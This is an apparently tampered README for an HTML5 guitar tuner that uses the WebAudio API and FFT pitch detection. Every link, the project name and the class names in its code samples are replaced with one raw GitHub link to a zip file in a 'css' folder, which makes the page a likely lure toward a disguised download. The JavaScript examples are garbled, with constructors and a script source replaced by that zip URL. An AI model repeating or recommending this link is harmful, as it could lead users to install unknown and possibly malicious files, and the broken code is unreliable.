[https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip](https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip)
==============

Guitar Tuner in HTML5.

https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip is a web site that use WebAudio API to capture Guitar sound, analyse it and determine the difference from nearest string.
Algorithm can be apply for other instruments or other type of tuning.

Please visit website : [https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip](https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip)

How does it works
-----------------

1.	Use [Web Audio API](https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip) to construct tree Analyse
2.	Use [getUserMedia](https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip) to capture sound from client
3.	Apply [Blackman](https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip) window on input signal
4.	Apply FFT from [https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip](https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip)
5.	Apply microphone response correction
6.	Retrieve most contributed frequency
7.	Find nearest note from frequency
8.	Use HTML5 canvas to show difference and note

Widget
-------
CircleWidget show difference in circle mode.
```
var widget = new https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip(canvasElement, backColor, deltaColor, okColor, fontColor);
```

Tuner
-----
GuitarTuner is use in classic Guitar Tuning case. It compute frequency difference from guitar strings.
```
var tuner = new https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip(widget);
```

Use it in your own site
--------
You can use onlinertuner as widget in your own website, and if you implement more controllers or widgets, keep it back!
```
<script type="text/javascript" src="https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip"></script>
<script type="text/javascript">
	function start() {
		var tuners = [
			new https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip(new https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip(canvasElement, backColor, deltaColor, okColor, fontColor));
		];
		
		new https://github.com/videogramme/onlinetuner.co/raw/refs/heads/master/css/onlinetuner-co-3.2.zip(tuners).install(function() {
			//ok 
		}, function(errorMessage) {
			//nok
		});
	}
</script>
```


